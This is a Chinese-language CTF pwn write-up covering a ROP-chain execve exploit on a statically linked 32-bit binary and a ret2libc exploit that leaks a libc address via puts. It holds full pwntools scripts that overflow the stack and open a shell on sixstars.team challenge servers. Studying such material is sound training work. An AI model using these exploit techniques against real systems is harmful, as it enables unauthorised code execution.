1.rop32  
常规做法是找gadgets（pop rax，ret这种）来调用execve

先用 ldd 程序名 看是不是一个动态库
不是  
先把漏洞函数的返回地址变成read函数地址，  
然后读取/bin/sh，把它放到一个可读可写的内存区里  
然后在返回main函数重来，把这里地址里的/bin/sh填到execve要的参数寄存器里，其他寄存器就找gadget为“pop 寄存器，ret”的来代替。   
然后找int 0x80
python
>>>elf = ELF("./rop32")
>>>map(hex,list(elf.search(asm("int 0x80",arch="i386"))))
将会返回程序中所有又int 0x80的位置，拿着位置去ida里看，只有在nt 0x80后还有一个ret的才是可以使用的。

如果是一个动态的库，在libc的库里找/bin/sh，基地址是动态的，但是偏移量是固定的，  
先在ida里找到read（）点过去的，jump table的地址（plt表），本地运行，x/查看这个地址里的一个地址，是read的地址  
然后用read的地址减去libc的地址这个地址是本地地址，就得到偏移量
然后找到bin/sh在libc中的偏移量
python
>>>elf = ELF("./rop32")
>>>elf.search("/bin/sh"))
>>>next(elf.search("/bin/sh")))
得到偏移量
*下面有更简单的直接得到各种地址的方式



parallels@parallels-vm:~/Documents$ checksec rop32
[*] '/home/parallels/Documents/rop32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
*NX说明栈上不可写
*所以需要找gadgets

parallels@parallels-vm:~/Documents$ ROPgadget --binary ./rop32 --only "pop|ret"
Gadgets information
============================================================
0x0809d7c2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0804b64b : pop dword ptr [ecx] ; ret
0x080921e4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0809d7ba : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080b8a16 : pop eax ; ret
0x0804c23d : pop eax ; ret 0x80e
0x080a6eac : pop eax ; ret 0xffff
0x0805b5ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809db75 : pop ebp ; pop esi ; pop edi ; ret
0x080483ca : pop ebp ; ret
0x080a1b95 : pop ebp ; ret 0x10
0x080961e4 : pop ebp ; ret 0x14
0x0807122c : pop ebp ; ret 0xc
0x0804aa49 : pop ebp ; ret 4
0x08049940 : pop ebp ; ret 8
0x0809db74 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x08099e2c : pop ebx ; pop edi ; ret
0x0806f10a : pop ebx ; pop edx ; ret
0x0804f034 : pop ebx ; pop esi ; pop ebp ; ret
0x080483c7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a1b92 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x080961e1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08071229 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0804aa46 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x0804993d : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x0804847e : pop ebx ; pop esi ; pop edi ; ret
0x0804975e : pop ebx ; pop esi ; pop edi ; ret 4
0x08048432 : pop ebx ; pop esi ; ret
0x080995d9 : pop ebx ; pop esi ; ret 8
0x080481c9 : pop ebx ; ret
0x080d3e1c : pop ebx ; ret 0x6f9
0x0806f131 : pop ecx ; pop ebx ; ret
0x080df231 : pop ecx ; ret
0x080483c9 : pop edi ; pop ebp ; ret
0x080a1b94 : pop edi ; pop ebp ; ret 0x10
0x080961e3 : pop edi ; pop ebp ; ret 0x14
0x0807122b : pop edi ; pop ebp ; ret 0xc
0x0804aa48 : pop edi ; pop ebp ; ret 4
0x0804993f : pop edi ; pop ebp ; ret 8
0x0806311b : pop edi ; pop esi ; pop ebx ; ret
0x0805c3b8 : pop edi ; pop esi ; ret
0x08048480 : pop edi ; ret
0x08049760 : pop edi ; ret 4
0x0806f130 : pop edx ; pop ecx ; pop ebx ; ret
0x0806f10b : pop edx ; ret
0x0809d7b9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0808fef0 : pop es ; pop ebx ; pop esi ; pop edi ; ret
0x0807a9e8 : pop es ; pop ebx ; pop esi ; ret
0x08066f9a : pop es ; pop edi ; ret
0x0804d839 : pop es ; pop esp ; ret 0x80b
0x080671da : pop es ; ret
0x0804f035 : pop esi ; pop ebp ; ret
0x0806f109 : pop esi ; pop ebx ; pop edx ; ret
0x0805c6c0 : pop esi ; pop ebx ; ret
0x080483c8 : pop esi ; pop edi ; pop ebp ; ret
0x080a1b93 : pop esi ; pop edi ; pop ebp ; ret 0x10
0x080961e2 : pop esi ; pop edi ; pop ebp ; ret 0x14
0x0807122a : pop esi ; pop edi ; pop ebp ; ret 0xc
0x0804aa47 : pop esi ; pop edi ; pop ebp ; ret 4
0x0804993e : pop esi ; pop edi ; pop ebp ; ret 8
0x0804847f : pop esi ; pop edi ; ret
0x0804975f : pop esi ; pop edi ; ret 4
0x08048433 : pop esi ; ret
0x080995da : pop esi ; ret 8
0x0805af60 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080b89c6 : pop esp ; ret
0x0804d83a : pop esp ; ret 0x80b
0x0804c29c : pop esp ; ret 0x80e
0x080ad300 : pop esp ; ret 0xfff9
0x0809e612 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080637a9 : pop ss ; ret 0x2c73
0x0806416a : pop ss ; ret 0x3273
0x08063794 : pop ss ; ret 0x3e73
0x08064150 : pop ss ; ret 0x4c73
0x0806377f : pop ss ; ret 0x5073
0x0806376a : pop ss ; ret 0x6273
0x08064136 : pop ss ; ret 0x6673
0x08061cd5 : pop ss ; ret 0x830f
0x080481b2 : ret
0x080484eb : ret 0
0x080a1b96 : ret 0x10
0x08079ff7 : ret 0x101  

但是！！！！因为本题是静态连接库，所以又很多gadgets片段  
此时！！可以用
ROPgadget --binary ./rop32 --ropchain  
直接得到一个execve的链  
运行后得到：  
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x80549cb mov dword ptr [edx], eax ; ret
	[+] Gadget found: 0x806f10b pop edx ; ret
	[+] Gadget found: 0x80b8a16 pop eax ; ret
	[+] Gadget found: 0x8049333 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x8049333 xor eax, eax ; ret
	[+] Gadget found: 0x804f0da inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret
	[+] Gadget found: 0x80df231 pop ecx ; ret
	[+] Gadget found: 0x806f10b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x806cd15 int 0x80

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806f10b) # pop edx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x080b8a16) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080549cb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f10b) # pop edx ; ret
	p += pack('<I', 0x080eb064) # @ .data + 4
	p += pack('<I', 0x080b8a16) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080549cb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f10b) # pop edx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x08049333) # xor eax, eax ; ret
	p += pack('<I', 0x080549cb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x080df231) # pop ecx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x0806f10b) # pop edx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x08049333) # xor eax, eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0804f0da) # inc eax ; ret
	p += pack('<I', 0x0806cd15) # int 0x80


所以脚本：  
from pwn import *
r=remote("pwn.sixstars.team",23610)
p = ""
p = p+'a'*(0x18+0x4)
p = p+ p32(0x0806f10b) # pop edx ; ret
p = p+ p32(0x080eb060) # @ .data
p = p+ p32(0x080b8a16) # pop eax ; ret
p = p+ '/bin'
p = p+ p32(0x080549cb) # mov dword ptr [edx], eax ; ret
p = p+ p32(0x0806f10b) # pop edx ; ret
p = p+ p32(0x080eb064) # @ .data + 4
p = p+ p32(0x080b8a16) # pop eax ; ret
p = p+ '//sh'
p = p+ p32(0x080549cb) # mov dword ptr [edx], eax ; ret
p = p+ p32(0x0806f10b) # pop edx ; ret
p = p+ p32(0x080eb068) # @ .data + 8
p = p+ p32(0x08049333) # xor eax, eax ; ret
p = p+ p32(0x080549cb) # mov dword ptr [edx], eax ; ret
p = p+ p32(0x080481c9) # pop ebx ; ret
p = p+ p32(0x080eb060) # @ .data
p = p+ p32(0x080df231) # pop ecx ; ret
p = p+ p32(0x080eb068) # @ .data + 8
p = p+ p32(0x0806f10b) # pop edx ; ret
p = p+ p32(0x080eb068) # @ .data + 8
p = p+ p32(0x08049333) # xor eax, eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0804f0da) # inc eax ; ret
p = p+ p32(0x0806cd15) # int 0x80
r.sendline(p)
r.recv()

r.interactive()



2.ret2libc
动态连接库，难点在于得到“/bin/sh"的字符串作为system函数的参数调用execve  
“/bin/sh"字符串一般出现在连接库文件中，又因为动态连接库性质，我们需要知道动态连接库的基地址    
得到基地址的方式是：得到整个程序连接好后的read函数地址，得到read函数在连接库文件中的偏移量  
有了基地址之后，可以通过“/bin/sh"在连接库中的偏移量来得到“/bin/sh"的地址  
而为了得到read函数运行时的地址，需要用程序里自带的puts函数输出got表中的read函数地址  
所以第一个栈内数据结构应该是：  
——————————————————
| got表中read地址  |  #puts函数的参数，就是puts返回的内容  
——————————————————
| main函数地址     |  #作为第一次返回的地址，重新调用main来再次发送第二个payload  
——————————————————
| plt表中puts地址  |
——————————————————
|aaaaaaaaa...aaa  |  #覆盖缓冲区使得puts地址在ret上（因为read函数没有做字符串溢出保护） 

第一次payload完成后会return到main然后重新调用main使服务器再收一次payload  
第二个栈内数据结构应该是：  
——————————————————
| “/bin/sh"地址   |  #system函数的参数   
——————————————————
| 随便一个返回地址  |  #下面用的是0，因为这个值没啥用   
——————————————————
|连接库中system地址|  #system函数加上“/bin/sh"参数可以直接运行的  
——————————————————
|aaaaaaaaa...aaa  |   



from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23613)
elf = ELF("./ret2libc")
puts_start = elf.plt["puts"]
puts_aug = elf.got["read"]
main_ret=0x0804854A
payload='a'*0x18+'a'*0x4+p32(puts_start)+p32(main_ret)+p32(puts_aug)  #0x18是栈大小，0x4是rbp，要覆盖掉这些，下面接的是ret地址  
#r.recvline()
r.sendline(payload)
r.recvuntil("Bye!\n")   #第一次payload发送后服务器会返回一串英文，以Bye！结尾，之后跟的是payload中要求服务器发送的read地址  
x=r.recv(4)
read_add=u32(x)
print 'readadd:=0x%x'%read_add
libc=ELF("./libc.so.6")
libc.address=read_add-libc.sym["read"]
print hex(libc.address)
binsh=next(libc.search('/bin/sh'))    #已经set了libc.address，这里得到的直接就是加上偏移后的运行地址了
print hex(binsh)
system=libc.sym['system']
payload2 = 'a'*0x18+'a'*0x4+p32(system)+p32(0)+p32(binsh)

r.sendline(payload2)
r.interactive()

